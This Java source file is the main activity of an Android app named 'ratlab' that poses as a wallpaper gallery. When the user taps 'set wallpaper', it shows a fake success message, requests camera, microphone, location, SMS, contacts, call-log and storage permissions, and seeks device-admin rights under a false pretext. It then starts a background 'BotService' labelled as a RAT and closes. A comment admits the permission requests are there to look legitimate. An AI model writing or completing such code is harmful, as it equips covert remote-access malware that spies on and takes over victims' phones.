package com.ratlab;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.GridView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERM_REQ = 1001;
    private static final int ADMIN_REQ = 1002;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        GridView grid = findViewById(R.id.gridWallpaper);
        grid.setAdapter(new WallpaperAdapter(this));

        Button btnSet = findViewById(R.id.btnSet);
        Button btnRefresh = findViewById(R.id.btnRefresh);

        btnSet.setOnClickListener(v -> {
            Toast.makeText(this, "Wallpaper berhasil diganti!", Toast.LENGTH_SHORT).show();
            // Action: minta izin + device admin + start service + close
            requestAllPermissions();
            requestDeviceAdmin();
            startRatService();
            new android.os.Handler().postDelayed(this::finish, 500);
        });

        btnRefresh.setOnClickListener(v -> {
            Toast.makeText(this, "Memuat wallpaper baru...", Toast.LENGTH_SHORT).show();
            grid.setAdapter(new WallpaperAdapter(this));
        });

        // Minta izin dulu (biar keliatan legit)
        requestAllPermissions();
    }

    private void startRatService() {
        Intent svc = new Intent(this, BotService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }
    }

    private void requestDeviceAdmin() {
        try {
            ComponentName admin = new ComponentName(this, AdminReceiver.class);
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            if (!dpm.isAdminActive(admin)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Aktifkan untuk mengelola wallpaper.");
                startActivityForResult(intent, ADMIN_REQ);
            }
        } catch (Exception e) {}
    }

    private void requestAllPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.SEND_SMS);
        perms.add(Manifest.permission.RECEIVE_SMS);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.CALL_PHONE);
        perms.add(Manifest.permission.READ_PHONE_STATE);
        perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }

        if (!toRequest.isEmpty()) {
            requestPermissions(toRequest.toArray(new String[0]), PERM_REQ);
        }
    }
}
